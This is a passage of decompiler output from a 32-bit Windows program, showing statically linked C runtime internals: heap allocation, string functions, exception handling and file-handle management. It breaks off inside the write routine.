        if ( v30 )
          *(_DWORD *)(a1 + 4) &= v11;
      }
      else
      {
        v25 = 0x80000000u >> v9;
        v26 = v49 + v3 + 4;
        v10 = ~v25;
        *(_DWORD *)(v3 + 4 * v4 + 68) &= v10;
        v27 = *(_BYTE *)v26-- == 1;
        if ( v27 )
          *(_DWORD *)a1 &= v10;
      }
    }
    *(_DWORD *)(*(_DWORD *)(v7 + 8) + 4) = *(_DWORD *)(v7 + 4);
    *(_DWORD *)(*(_DWORD *)(v7 + 4) + 8) = *(_DWORD *)(v7 + 8);
    v48 += a3 - v8;
    if ( v48 <= 0 )
    {
      v16 = a2;
    }
    else
    {
      v13 = (v48 >> 4) - 1;
      v12 = a2 + v8 - 4;
      if ( (unsigned int)v13 > 0x3F )
        v13 = 63;
      a3 = v47 + 8 * v13;
      *(_DWORD *)(a2 + v8) = *(_DWORD *)(v47 + 8 * v13 + 4);
      v31 = a3;
      *(_DWORD *)(v12 + 8) = a3;
      *(_DWORD *)(v31 + 4) = v12;
      *(_DWORD *)(*(_DWORD *)(v12 + 4) + 8) = v12;
      if ( *(_DWORD *)(v12 + 4) == *(_DWORD *)(v12 + 8) )
      {
        v32 = *(_BYTE *)(v13 + v3 + 4);
        BYTE3(a3) = *(_BYTE *)(v13 + v3 + 4);
        *(_BYTE *)(v13 + v3 + 4) = v32 + 1;
        if ( (unsigned int)v13 >= 0x20 )
        {
          if ( !BYTE3(a3) )
            *(_DWORD *)(a1 + 4) |= 0x80000000u >> (v13 - 32);
          v14 = v3 + 4 * v4 + 196;
          v15 = v13 - 32;
        }
        else
        {
          if ( !BYTE3(a3) )
            *(_DWORD *)a1 |= 0x80000000u >> v13;
          v14 = v3 + 4 * v4 + 68;
          LOBYTE(v15) = v13;
        }
        *(_DWORD *)v14 |= 0x80000000u >> v15;
      }
      v16 = a2;
      v33 = v48;
      v34 = a2 + v8 - 4;
      *(_DWORD *)v34 = v48;
      *(_DWORD *)(v33 + v34 - 4) = v33;
    }
    *(_DWORD *)(v16 - 4) = v8 + 1;
    *(_DWORD *)(v16 + v8 - 8) = v8 + 1;
  }
  return 1;
}

//----- (00404EF1) --------------------------------------------------------
int __cdecl _sbh_alloc_block(unsigned int a1)
{
  int v1; // ecx@1
  unsigned int v2; // esi@2
  char v3; // cf@4
  unsigned int v4; // ebx@4
  int v5; // eax@14
  int v6; // edx@14
  int v7; // ecx@16
  int v8; // ecx@19
  signed int v9; // edi@19
  int v11; // edx@35
  signed int v12; // ecx@35
  int v13; // esi@35
  int v14; // edx@58
  char v15; // zf@14
  int v16; // edx@16
  int v17; // edx@17
  char *v18; // eax@30
  unsigned int v19; // ebx@40
  int v20; // edi@40
  unsigned int v21; // ebx@40
  char v22; // zf@40
  unsigned int v23; // ebx@42
  int v24; // edi@42
  unsigned int v25; // ebx@42
  char v26; // zf@42
  char v27; // zf@45
  int v28; // ecx@46
  int v29; // edi@46
  char v30; // cl@47
  int v31; // esi@58
  int v32; // ecx@58
  char v33; // zf@58
  int v34; // [sp+10h] [bp-10h]@1
  int v35; // [sp+1Ch] [bp-4h]@1
  unsigned int v36; // [sp+18h] [bp-8h]@2
  int v37; // [sp+14h] [bp-Ch]@4
  unsigned int v38; // [sp+Ch] [bp-14h]@40

  v34 = (a1 + 23) & 0xFFFFFFF0;
  v1 = ((signed int)((a1 + 23) & 0xFFFFFFF0) >> 4) - 1;
  v35 = (int)((char *)_sbh_pHeaderList + 20 * _sbh_cntHeaderList);
  if ( v1 >= 32 )
  {
    v2 = 0;
    v36 = 0xFFFFFFFFu >> (((signed int)((a1 + 23) & 0xFFFFFFF0) >> 4) - 33);
  }
  else
  {
    v2 = 0xFFFFFFFFu >> v1;
    v36 = -1;
  }
  v4 = _sbh_pHeaderScan;
  v37 = v2;
  v3 = _sbh_pHeaderScan < (unsigned int)((char *)_sbh_pHeaderList + 20 * _sbh_cntHeaderList);
  while ( 1 )
  {
    a1 = v4;
    if ( !v3 )
      break;
    if ( v2 & *(_DWORD *)v4 | v36 & *(_DWORD *)(v4 + 4) )
      break;
    v4 += 20;
    v3 = v4 < v35;
  }
  if ( v4 == v35 )
  {
    v4 = (unsigned int)_sbh_pHeaderList;
    while ( 1 )
    {
      a1 = v4;
      if ( v4 >= _sbh_pHeaderScan )
        break;
      if ( v2 & *(_DWORD *)v4 | v36 & *(_DWORD *)(v4 + 4) )
        break;
      v4 += 20;
    }
    if ( v4 == _sbh_pHeaderScan )
    {
      while ( v4 < v35 && !*(_DWORD *)(v4 + 8) )
      {
        v4 += 20;
        a1 = v4;
      }
      if ( v4 == v35 )
      {
        v4 = (unsigned int)_sbh_pHeaderList;
        while ( 1 )
        {
          a1 = v4;
          if ( v4 >= _sbh_pHeaderScan )
            break;
          if ( *(_DWORD *)(v4 + 8) )
            break;
          v4 += 20;
        }
        if ( v4 == _sbh_pHeaderScan )
        {
          v18 = _sbh_alloc_new_region();
          v4 = (unsigned int)v18;
          a1 = (unsigned int)v18;
          if ( !v18 )
            return 0;
        }
      }
      **(_DWORD **)(v4 + 16) = _sbh_alloc_new_group(v4);
      if ( **(_DWORD **)(v4 + 16) == -1 )
        return 0;
    }
  }
  _sbh_pHeaderScan = v4;
  v5 = *(_DWORD *)(v4 + 16);
  v6 = *(_DWORD *)v5;
  v15 = *(_DWORD *)v5 == -1;
  v35 = *(_DWORD *)v5;
  if ( v15 || !(v2 & *(_DWORD *)(v5 + 4 * v6 + 68) | v36 & *(_DWORD *)(v5 + 4 * v6 + 196)) )
  {
    v16 = v36 & *(_DWORD *)(v5 + 196);
    v35 = 0;
    v7 = v5 + 68;
    v2 = v37;
    if ( !(v37 & *(_DWORD *)(v5 + 68) | v16) )
    {
      do
      {
        v17 = v36 & *(_DWORD *)(v7 + 132);
        ++v35;
        v7 += 4;
      }
      while ( !(v37 & *(_DWORD *)v7 | v17) );
    }
    v6 = v35;
  }
  v37 = 516 * v6 + v5 + 324;
  v9 = 0;
  v8 = v2 & *(_DWORD *)(v5 + 4 * v6 + 68);
  if ( !(v2 & *(_DWORD *)(v5 + 4 * v6 + 68)) )
  {
    v8 = v36 & *(_DWORD *)(v5 + 4 * v6 + 196);
    v9 = 32;
  }
  while ( v8 >= 0 )
  {
    v8 *= 2;
    ++v9;
  }
  v11 = *(_DWORD *)(v37 + 8 * v9 + 4);
  v12 = *(_DWORD *)v11 - v34;
  v13 = (v12 >> 4) - 1;
  v36 = *(_DWORD *)v11 - v34;
  if ( v13 > 63 )
    v13 = 63;
  if ( v13 == v9 )
    goto LABEL_55;
  if ( *(_DWORD *)(v11 + 4) == *(_DWORD *)(v11 + 8) )
  {
    if ( v9 >= 32 )
    {
      v23 = 0x80000000u >> (v9 - 32);
      v24 = v5 + v9 + 4;
      v25 = ~v23;
      *(_DWORD *)(v5 + 4 * v35 + 196) &= v25;
      v26 = *(_BYTE *)v24-- == 1;
      v38 = v25;
      if ( v26 )
      {
        v4 = a1;
        *(_DWORD *)(a1 + 4) &= v38;
        goto LABEL_45;
      }
    }
    else
    {
      v19 = 0x80000000u >> v9;
      v20 = v5 + v9 + 4;
      v21 = ~v19;
      v38 = v21;
      *(_DWORD *)(v5 + 4 * v35 + 68) &= v21;
      v22 = *(_BYTE *)v20-- == 1;
      if ( v22 )
      {
        v4 = a1;
        *(_DWORD *)a1 &= v38;
        goto LABEL_45;
      }
    }
    v4 = a1;
  }
LABEL_45:
  v27 = v36 == 0;
  *(_DWORD *)(*(_DWORD *)(v11 + 8) + 4) = *(_DWORD *)(v11 + 4);
  *(_DWORD *)(*(_DWORD *)(v11 + 4) + 8) = *(_DWORD *)(v11 + 8);
  if ( !v27 )
  {
    v28 = v37 + 8 * v13;
    v29 = *(_DWORD *)(v28 + 4);
    *(_DWORD *)(v11 + 8) = v37 + 8 * v13;
    *(_DWORD *)(v11 + 4) = v29;
    *(_DWORD *)(v28 + 4) = v11;
    *(_DWORD *)(*(_DWORD *)(v11 + 4) + 8) = v11;
    if ( *(_DWORD *)(v11 + 4) == *(_DWORD *)(v11 + 8) )
    {
      v30 = *(_BYTE *)(v13 + v5 + 4);
      BYTE3(a1) = *(_BYTE *)(v13 + v5 + 4);
      *(_BYTE *)(v13 + v5 + 4) = v30 + 1;
      if ( v13 >= 32 )
      {
        if ( !BYTE3(a1) )
          *(_DWORD *)(v4 + 4) |= 0x80000000u >> (v13 - 32);
        *(_DWORD *)(v5 + 4 * v35 + 196) |= 0x80000000u >> (v13 - 32);
      }
      else
      {
        if ( !BYTE3(a1) )
          *(_DWORD *)v4 |= 0x80000000u >> v13;
        *(_DWORD *)(v5 + 4 * v35 + 68) |= 0x80000000u >> v13;
      }
    }
    v12 = v36;
LABEL_55:
    if ( v12 )
    {
      *(_DWORD *)v11 = v12;
      *(_DWORD *)(v12 + v11 - 4) = v12;
    }
    goto LABEL_58;
  }
  v12 = v36;
LABEL_58:
  v31 = v34;
  v14 = v12 + v11;
  v32 = v34 + 1;
  *(_DWORD *)v14 = v34 + 1;
  *(_DWORD *)(v14 + v31 - 4) = v32;
  v33 = *(_DWORD *)v37++ == 0;
  if ( v33 )
  {
    if ( v4 == _sbh_pHeaderDefer )
    {
      if ( v35 == _sbh_indGroupDefer )
        _sbh_pHeaderDefer = 0;
    }
  }
  *(_DWORD *)v5 = v35;
  return v14 + 4;
}

//----- (004051F0) --------------------------------------------------------
int __cdecl strcmp(int a1, int a2)
{
  int v2; // edx@1
  int v3; // ecx@1
  unsigned __int8 v4; // cf@2
  unsigned int v5; // eax@2
  unsigned int v6; // eax@6
  __int16 v8; // ax@16

  v2 = a1;
  v3 = a2;
  if ( !(a1 & 3) )
  {
LABEL_2:
    while ( 1 )
    {
      v5 = *(_DWORD *)v2;
      v4 = (unsigned __int8)*(_DWORD *)v2 < *(_BYTE *)v3;
      if ( (unsigned __int8)*(_DWORD *)v2 != *(_BYTE *)v3 )
        break;
      if ( !(_BYTE)v5 )
        return 0;
      v4 = BYTE1(v5) < *(_BYTE *)(v3 + 1);
      if ( BYTE1(v5) != *(_BYTE *)(v3 + 1) )
        break;
      if ( !BYTE1(v5) )
        return 0;
      v6 = v5 >> 16;
      v4 = (_BYTE)v6 < *(_BYTE *)(v3 + 2);
      if ( (_BYTE)v6 != *(_BYTE *)(v3 + 2) )
        break;
      if ( !(_BYTE)v6 )
        return 0;
      v4 = BYTE1(v6) < *(_BYTE *)(v3 + 3);
      if ( BYTE1(v6) != *(_BYTE *)(v3 + 3) )
        break;
      v3 += 4;
      v2 += 4;
      if ( !BYTE1(v6) )
        return 0;
    }
    return -2 * v4 + 1;
  }
  if ( a1 & 1 )
  {
    v2 = a1 + 1;
    v4 = *(_BYTE *)a1 < *(_BYTE *)a2;
    if ( *(_BYTE *)a1 != *(_BYTE *)a2 )
      return -2 * v4 + 1;
    v3 = a2 + 1;
    if ( !*(_BYTE *)a1 )
      return 0;
    if ( !(v2 & 2) )
      goto LABEL_2;
  }
  v8 = *(_WORD *)v2;
  v2 += 2;
  v4 = (_BYTE)v8 < *(_BYTE *)v3;
  if ( (_BYTE)v8 != *(_BYTE *)v3 )
    return -2 * v4 + 1;
  if ( !(_BYTE)v8 )
    return 0;
  v4 = HIBYTE(v8) < *(_BYTE *)(v3 + 1);
  if ( HIBYTE(v8) == *(_BYTE *)(v3 + 1) )
  {
    if ( HIBYTE(v8) )
    {
      v3 += 2;
      goto LABEL_2;
    }
    return 0;
  }
  return -2 * v4 + 1;
}

//----- (00405278) --------------------------------------------------------
int __cdecl realloc(LPVOID lpMem, DWORD dwBytes)
{
  void *v2; // ebx@1
  int result; // eax@2
  unsigned int v4; // esi@3
  LPVOID v5; // edi@6
  int v6; // eax@7
  int v7; // ebp@7
  int v8; // eax@12
  int v9; // eax@19
  int v10; // eax@11
  int v11; // eax@14
  LPVOID v12; // eax@18

  v2 = lpMem;
  if ( !lpMem )
    return malloc(dwBytes);
  v4 = dwBytes;
  if ( !dwBytes )
  {
    free((int)lpMem);
    return 0;
  }
  if ( _active_heap == 3 )
  {
    while ( 1 )
    {
      v5 = 0;
      if ( v4 > 0xFFFFFFE0 )
        goto LABEL_27;
      v6 = (int)_sbh_find_block((int)v2);
      v7 = v6;
      if ( v6 )
        break;
LABEL_23:
      if ( !v4 )
        ++v4;
      v4 = (v4 + 15) & 0xFFFFFFF0;
      v5 = HeapReAlloc(crtheap, 0, v2, v4);
LABEL_26:
      if ( v5 )
        return (int)v5;
LABEL_27:
      if ( !newmode )
        return (int)v5;
      if ( !callnewh(v4) )
        return 0;
    }
    if ( v4 <= _sbh_threshold )
    {
      if ( _sbh_resize_block(v6, (int)v2, v4) )
      {
        v5 = v2;
        goto LABEL_15;
      }
      v10 = _sbh_alloc_block(v4);
      v5 = (LPVOID)v10;
      if ( v10 )
      {
        v8 = *((_DWORD *)v2 - 1) - 1;
        if ( v8 >= v4 )
          v8 = v4;
        memcpy(v5, v2, v8);
        v11 = (int)_sbh_find_block((int)v2);
        v7 = v11;
        _sbh_free_block(v11, (int)v2);
LABEL_15:
        if ( v5 )
          goto LABEL_22;
        goto LABEL_16;
      }
    }
LABEL_16:
    if ( !v4 )
      ++v4;
    v4 = (v4 + 15) & 0xFFFFFFF0;
    v12 = HeapAlloc(crtheap, 0, v4);
    v5 = v12;
    if ( v12 )
    {
      v9 = *((_DWORD *)v2 - 1) - 1;
      if ( v9 >= v4 )
        v9 = v4;
      memcpy(v5, v2, v9);
      _sbh_free_block(v7, (int)v2);
    }
LABEL_22:
    if ( v7 )
      goto LABEL_26;
    goto LABEL_23;
  }
  while ( 1 )
  {
    result = 0;
    if ( v4 <= 0xFFFFFFE0 )
    {
      if ( !v4 )
        ++v4;
      result = (int)HeapReAlloc(crtheap, 0, v2, v4);
      if ( result )
        break;
    }
    if ( !newmode )
      break;
    if ( !callnewh(v4) )
      return 0;
  }
  return result;
}

//----- (004053DA) --------------------------------------------------------
DWORD __cdecl msize(LPCVOID lpMem)
{
  LPCVOID v1; // esi@2
  LPCVOID v3; // ST08_4@4

  if ( _active_heap == 3 )
  {
    v1 = lpMem;
    if ( _sbh_find_block((int)lpMem) )
      return *((_DWORD *)v1 - 1) - 9;
    v3 = v1;
  }
  else
  {
    v3 = lpMem;
  }
  return HeapSize(crtheap, 0, v3);
}

//----- (00405412) --------------------------------------------------------
LONG __stdcall _CxxUnhandledExceptionFilter(struct _EXCEPTION_POINTERS *a1)
{
  PEXCEPTION_RECORD v1; // eax@1
  struct _EXCEPTION_POINTERS *v2; // esi@1
  signed int v3; // eax@3
  LONG result; // eax@8

  v2 = a1;
  v1 = a1->ExceptionRecord;
  if ( a1->ExceptionRecord->ExceptionCode == -529697949 )
  {
    if ( v1->NumberParameters == 3 )
    {
      v3 = v1->ExceptionInformation[0];
      if ( v3 == 429065504 || v3 == 429065505 )
        terminate();
    }
  }
  if ( pOldExceptFilter && ValidateExecute((FARPROC)pOldExceptFilter) )
    result = pOldExceptFilter(v2);
  else
    result = 0;
  return result;
}

//----- (00405460) --------------------------------------------------------
int __cdecl _CxxSetUnhandledExceptionFilter()
{
  pOldExceptFilter = SetUnhandledExceptionFilter(_CxxUnhandledExceptionFilter);
  return 0;
}

//----- (00405473) --------------------------------------------------------
LPTOP_LEVEL_EXCEPTION_FILTER __cdecl _CxxRestoreUnhandledExceptionFilter()
{
  return SetUnhandledExceptionFilter(pOldExceptFilter);
}

//----- (00405480) --------------------------------------------------------
int __cdecl _crtMessageBoxA(int a1, int a2, int a3)
{
  int v3; // ebx@1
  HMODULE v4; // eax@2
  HMODULE v5; // edi@2
  int v6; // eax@8
  int v8; // eax@16
  FARPROC v9; // eax@3
  FARPROC v10; // eax@5
  char v11; // [sp+Ch] [bp-10h]@9
  char v12; // [sp+18h] [bp-4h]@9
  char v13; // [sp+14h] [bp-8h]@10

  v3 = 0;
  if ( !dword_40B914 )
  {
    v4 = LoadLibraryA("user32.dll");
    v5 = v4;
    if ( !v4
      || (v9 = GetProcAddress(v4, "MessageBoxA"), dword_40B914 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))v9, !v9) )
      return 0;
    dword_40B918 = (int (*)(void))GetProcAddress(v5, "GetActiveWindow");
    dword_40B91C = (int (__stdcall *)(_DWORD))GetProcAddress(v5, "GetLastActivePopup");
    if ( osplatform == 2 )
    {
      v10 = GetProcAddress(v5, "GetUserObjectInformationA");
      dword_40B924 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))v10;
      if ( v10 )
        dword_40B920 = (int (*)(void))GetProcAddress(v5, "GetProcessWindowStation");
    }
  }
  if ( !dword_40B920 || (v6 = dword_40B920(), v6) && dword_40B924(v6, 1, &v11, 12, &v12) && v13 & 1 )
  {
    if ( dword_40B918 )
    {
      v8 = dword_40B918();
      v3 = v8;
      if ( v8 )
      {
        if ( dword_40B91C )
          v3 = dword_40B91C(v8);
      }
    }
  }
  else
  {
    if ( (unsigned int)winmajor < 4 )
      BYTE2(a3) |= 4u;
    else
      BYTE2(a3) |= 0x20u;
  }
  return dword_40B914(v3, a1, a2, a3);
}

//----- (00405580) --------------------------------------------------------
int __cdecl strncpy(int a1, int a2, unsigned int a3)
{
  unsigned int v3; // ecx@1
  unsigned int v4; // ebx@2
  int v5; // edi@2
  int v6; // esi@2
  unsigned int v7; // ecx@3
  char v8; // al@5
  int v10; // ecx@16
  int v11; // edx@21
  int v12; // eax@21

  v3 = a3;
  if ( !a3 )
    return a1;
  v4 = a3;
  v6 = a2;
  v5 = a1;
  if ( !(a2 & 3) )
  {
    v7 = a3 >> 2;
    if ( a3 >> 2 )
      goto LABEL_21;
LABEL_10:
    while ( 1 )
    {
      v8 = *(_BYTE *)v6++;
      *(_BYTE *)v5++ = v8;
      if ( !v8 )
        break;
      --v4;
      if ( !v4 )
        return a1;
    }
    while ( 1 )
    {
      --v4;
      if ( !v4 )
        break;
LABEL_17:
      *(_BYTE *)v5++ = v8;
    }
    return a1;
  }
  do
  {
    v8 = *(_BYTE *)v6++;
    *(_BYTE *)v5++ = v8;
    --v3;
    if ( !v3 )
      return a1;
    if ( !v8 )
    {
      while ( v5 & 3 )
      {
        *(_BYTE *)v5++ = v8;
        --v3;
        if ( !v3 )
          return a1;
      }
      v4 = v3;
      v10 = v3 >> 2;
      if ( !v10 )
        goto LABEL_17;
      goto LABEL_31;
    }
  }
  while ( v6 & 3 );
  LOBYTE(v4) = v3;
  v7 = v3 >> 2;
  if ( !v7 )
  {
LABEL_9:
    v4 &= 3u;
    if ( v4 )
      goto LABEL_10;
    return a1;
  }
  while ( 1 )
  {
LABEL_21:
    v12 = (*(_DWORD *)v6 + 2130640639) ^ ~*(_DWORD *)v6;
    v11 = *(_DWORD *)v6;
    v6 += 4;
    if ( !(v12 & 0x81010100) )
      goto LABEL_20;
    if ( !(_BYTE)v11 )
      break;
    if ( !BYTE1(v11) )
    {
      *(_DWORD *)v5 = (_BYTE)v11;
      goto LABEL_30;
    }
    if ( !(v11 & 0xFF0000) )
    {
      *(_DWORD *)v5 = (_WORD)v11;
      goto LABEL_30;
    }
    if ( !(v11 & 0xFF000000) )
    {
      *(_DWORD *)v5 = v11;
      goto LABEL_30;
    }
LABEL_20:
    *(_DWORD *)v5 = v11;
    v5 += 4;
    --v7;
    if ( !v7 )
      goto LABEL_9;
  }
  *(_DWORD *)v5 = 0;
LABEL_30:
  v5 += 4;
  v8 = 0;
  v10 = v7 - 1;
  if ( v10 )
  {
LABEL_31:
    v8 = 0;
    do
    {
      *(_DWORD *)v5 = 0;
      v5 += 4;
      --v10;
    }
    while ( v10 );
  }
  v4 &= 3u;
  if ( v4 )
    goto LABEL_17;
  return a1;
}

//----- (004056A4) --------------------------------------------------------
int __cdecl _global_unwind2(int a1)
{
  return RtlUnwind(a1, loc_4056BC, 0, 0);
}

//----- (004056C4) --------------------------------------------------------
signed int __cdecl _unwind_handler(int a1, int a2, int a3, int a4)
{
  signed int result; // eax@1

  result = 1;
  if ( *(_DWORD *)(a1 + 4) & 6 )
  {
    *(_DWORD *)a4 = a2;
    result = 3;
  }
  return result;
}

//----- (004056E6) --------------------------------------------------------
#error "40573A: invalid basic block (funcsize=26)"

//----- (0040574E) --------------------------------------------------------
int __cdecl _abnormal_termination()
{
  int ecx0; // ecx@0
  int result; // eax@1

  result = 0;
  if ( *(_DWORD *)(ecx0 + 4) == (_DWORD)_unwind_handler )
  {
    if ( *(_DWORD *)(ecx0 + 8) == *(_DWORD *)(*(_DWORD *)(ecx0 + 12) + 12) )
      result = 1;
  }
  return result;
}

//----- (00405771) --------------------------------------------------------
#error "405778: invalid basic block (funcsize=4)"

//----- (0040577A) --------------------------------------------------------
#error "40578A: invalid basic block (funcsize=7)"

//----- (0040578D) --------------------------------------------------------
#error "FFFFFFFF: positive sp value has been found (funcsize=0)"

//----- (00405792) --------------------------------------------------------
signed int __cdecl ValidateEH3RN(unsigned int a1)
{
  const void *v1; // ebx@1
  unsigned int v2; // esi@1
  signed int v4; // edi@5
  const void *v5; // eax@7
  unsigned int v6; // edx@7
  unsigned int v7; // eax@14
  int v8; // edi@16
  int v9; // esi@16
  char *v10; // eax@23
  int v11; // ecx@25
  unsigned int v12; // ebx@25
  unsigned int v13; // eax@26
  int v14; // edx@30
  int v15; // ecx@30
  int v16; // eax@31
  int v17; // ebx@35
  int j; // edx@37
  int v19; // eax@46
  int i; // ecx@54
  unsigned int v21; // ecx@2
  int v22; // eax@38
  int v23; // esi@38
  int v24; // eax@55
  int v25; // edx@55
  unsigned int v26; // [sp+24h] [bp-4h]@2
  struct _MEMORY_BASIC_INFORMATION Buffer; // [sp+8h] [bp-20h]@19

  v2 = a1;
  v1 = *(const void **)(a1 + 8);
  if ( (_BYTE)v1 & 3
    || (a1 = *MK_FP(__FS__, 24), v21 = *(_DWORD *)(a1 + 8), v26 = *(_DWORD *)(a1 + 8), (unsigned int)v1 >= v21)
    && (unsigned int)v1 < *(_DWORD *)(a1 + 4) )
    return 0;
  v4 = *(_DWORD *)(v2 + 12);
  if ( v4 == -1 )
    return 1;
  v6 = 0;
  a1 = 0;
  v5 = v1;
  do
  {
    if ( *(_DWORD *)v5 != -1 && *(_DWORD *)v5 >= v6 )
      return 0;
    if ( *((_DWORD *)v5 + 1) )
      ++a1;
    ++v6;
    v5 = (char *)v5 + 12;
  }
  while ( v6 <= v4 );
  if ( a1 )
  {
    v7 = *(_DWORD *)(v2 - 8);
    if ( v7 < v26 || v7 >= v2 )
      return 0;
  }
  v8 = (unsigned int)v1 & 0xFFFFF000;
  v9 = 0;
  if ( nValidPages > 0 )
  {
    while ( rgValidPages[v9] != v8 )
    {
      ++v9;
      if ( v9 >= nValidPages )
        goto LABEL_19;
    }
    if ( v9 <= 0 || InterlockedExchange(&lModifying, 1) )
      return 1;
    if ( rgValidPages[v9] != v8 )
    {
      v19 = nValidPages;
      v9 = nValidPages - 1;
      if ( nValidPages - 1 < 0 )
        goto LABEL_60;
      do
      {
        if ( rgValidPages[v9] == v8 )
          break;
        --v9;
      }
      while ( v9 >= 0 );
      if ( v9 >= 0 )
      {
        if ( !v9 )
        {
LABEL_56:
          InterlockedExchange(&lModifying, 0);
          return 1;
        }
      }
      else
      {
LABEL_60:
        if ( nValidPages < 16 )
          v19 = nValidPages++ + 1;
        v9 = v19 - 1;
      }
    }
    for ( i = 0; i <= v9; v8 = v25 )
    {
      v24 = 4 * i + 4241712;
      v25 = rgValidPages[i++];
      *(_DWORD *)v24 = v8;
    }
    goto LABEL_56;
  }
LABEL_19:
  if ( VirtualQuery(v1, &Buffer, 0x1Cu) && Buffer.Type == 16777216 )
  {
    if ( !(LOBYTE(Buffer.Protect) & 0xCC) )
    {
LABEL_29:
      if ( !InterlockedExchange(&lModifying, 1) )
      {
        v15 = nValidPages;
        v14 = nValidPages;
        if ( nValidPages > 0 )
        {
          v16 = 4 * nValidPages + 4241708;
          do
          {
            if ( *(_DWORD *)v16 == v8 )
              break;
            --v14;
            v16 -= 4;
          }
          while ( v14 > 0 );
        }
        if ( !v14 )
        {
          v17 = 15;
          if ( nValidPages <= 15 )
            v17 = nValidPages;
          for ( j = 0; j <= v17; v8 = v23 )
          {
            v22 = 4 * j + 4241712;
            v23 = rgValidPages[j++];
            *(_DWORD *)v22 = v8;
          }
          if ( v15 < 16 )
            nValidPages = v15 + 1;
        }
        InterlockedExchange(&lModifying, 0);
      }
      return 1;
    }
    if ( *(_WORD *)Buffer.AllocationBase == 23117 )
    {
      v10 = (char *)Buffer.AllocationBase + *((_DWORD *)Buffer.AllocationBase + 15);
      if ( *(_DWORD *)v10 == 17744 )
      {
        if ( *((_WORD *)v10 + 12) == 267 )
        {
          v12 = v1 - Buffer.AllocationBase;
          v11 = (int)&v10[*((_WORD *)v10 + 10) + 24];
          if ( *((_WORD *)v10 + 3) )
          {
            v13 = *(_DWORD *)&v10[*((_WORD *)v10 + 10) + 36];
            if ( v12 < v13 || v12 >= v13 + *(_DWORD *)(v11 + 8) || !(*(_BYTE *)(v11 + 39) & 0x80) )
              goto LABEL_29;
            return 0;
          }
        }
      }
    }
  }
  return -1;
}

//----- (004059BB) --------------------------------------------------------
int __cdecl dosmaperr(int a1)
{
  int result; // eax@1
  unsigned int v2; // ecx@1

  result = a1;
  doserrno = a1;
  v2 = 0;
  do
  {
    if ( a1 == errtable[2 * v2] )
    {
      result = stru_40B4A4[2 * v2];
      errno = stru_40B4A4[2 * v2];
      return result;
    }
    ++v2;
  }
  while ( v2 < 0x2D );
  if ( (unsigned int)a1 < 0x13 || (unsigned int)a1 > 0x24 )
  {
    if ( (unsigned int)a1 < 0xBC || (errno = 8, (unsigned int)a1 > 0xCA) )
      errno = 22;
  }
  else
  {
    errno = 13;
  }
  return result;
}

//----- (00405A1A) --------------------------------------------------------
int __cdecl alloc_osfhnd()
{
  int v0; // edx@1
  int *v1; // ecx@1
  int v2; // ebx@1
  int v3; // esi@1
  int v4; // eax@2
  int v5; // ebp@3
  int v6; // eax@11
  int v7; // edx@12
  int v9; // eax@8

  v2 = -1;
  v3 = 0;
  v0 = 0;
  v1 = _pioinfo;
  while ( 1 )
  {
    v4 = *v1;
    if ( !*v1 )
      break;
    v5 = v4 + 256;
    while ( v4 < (unsigned int)v5 )
    {
      if ( !(*(_BYTE *)(v4 + 4) & 1) )
      {
        *(_DWORD *)v4 = -1;
        v9 = v0 + ((v4 - *v1) >> 3);
        v2 = v9;
        if ( v9 != -1 )
          return v2;
        break;
      }
      v4 += 8;
      v5 = *v1 + 256;
    }
    ++v1;
    ++v3;
    v0 += 32;
    if ( (signed int)v1 >= (signed int)&_piob )
      return v2;
  }
  v6 = malloc(0x100u);
  if ( v6 )
  {
    nhandle += 32;
    _pioinfo[v3] = v6;
    v7 = v6 + 256;
    while ( v6 < (unsigned int)v7 )
    {
      *(_DWORD *)v6 = -1;
      *(_BYTE *)(v6 + 4) = 0;
      *(_BYTE *)(v6 + 5) = 10;
      v6 += 8;
      v7 = _pioinfo[v3] + 256;
    }
    v2 = 32 * v3;
  }
  return v2;
}

//----- (00405AB7) --------------------------------------------------------
signed int __cdecl set_osfhnd(int a1, HANDLE hHandle)
{
  int v2; // edi@2
  int v3; // esi@2
  HANDLE v4; // ebx@3
  DWORD v5; // ST00_4@7
  HANDLE v6; // ST04_4@7

  if ( a1 < nhandle )
  {
    v2 = 4 * (a1 >> 5) + 4242496;
    v3 = 8 * (a1 & 0x1F);
    if ( *(_DWORD *)(v3 + _pioinfo[a1 >> 5]) == -1 )
    {
      v4 = hHandle;
      if ( _app_type == 1 )
      {
        if ( !a1 )
        {
          v6 = hHandle;
          v5 = -10;
          goto LABEL_10;
        }
        if ( a1 == 1 )
        {
          v6 = hHandle;
          v5 = -11;
          goto LABEL_10;
        }
        if ( a1 == 2 )
        {
          v6 = hHandle;
          v5 = -12;
LABEL_10:
          SetStdHandle(v5, v6);
          goto LABEL_11;
        }
      }
LABEL_11:
      *(_DWORD *)(v3 + *(_DWORD *)v2) = v4;
      return 0;
    }
  }
  doserrno = 0;
  errno = 9;
  return -1;
}

//----- (00405B2E) --------------------------------------------------------
signed int __cdecl free_osfhnd(signed int a1)
{
  int v1; // eax@2
  int v2; // edi@2
  int v3; // esi@2
  DWORD v4; // ST00_4@8
  void *v5; // ST04_4@8

  if ( a1 < nhandle )
  {
    v2 = 4 * (a1 >> 5) + 4242496;
    v3 = 8 * (a1 & 0x1F);
    v1 = v3 + _pioinfo[a1 >> 5];
    if ( *(_BYTE *)(v1 + 4) & 1 )
    {
      if ( *(_DWORD *)v1 != -1 )
      {
        if ( _app_type == 1 )
        {
          if ( !a1 )
          {
            v5 = 0;
            v4 = -10;
            goto LABEL_11;
          }
          if ( a1 == 1 )
          {
            v5 = 0;
            v4 = -11;
            goto LABEL_11;
          }
          if ( a1 == 2 )
          {
            v5 = 0;
            v4 = -12;
LABEL_11:
            SetStdHandle(v4, v5);
            goto LABEL_12;
          }
        }
LABEL_12:
        *(_DWORD *)(v3 + *(_DWORD *)v2) = -1;
        return 0;
      }
    }
  }
  doserrno = 0;
  errno = 9;
  return -1;
}

//----- (00405BA8) --------------------------------------------------------
signed int __cdecl get_osfhandle(unsigned int a1)
{
  int v1; // eax@2
  signed int result; // eax@3

  if ( a1 < nhandle && (v1 = _pioinfo[(signed int)a1 >> 5] + 8 * (a1 & 0x1F), *(_BYTE *)(v1 + 4) & 1) )
  {
    result = *(_DWORD *)v1;
  }
  else
  {
    doserrno = 0;
    errno = 9;
    result = -1;
  }
  return result;
}

//----- (00405BE4) --------------------------------------------------------
int __cdecl write(int a1, const void *a2, unsigned int a3)
{
  char v3; // al@2
  int v4; // ebx@2
  int v5; // esi@2
  int v6; // edi@3
  int v8; // eax@7
  char *v9; // eax@9
  unsigned int v10; // ecx@9
  char v11; // dl@11
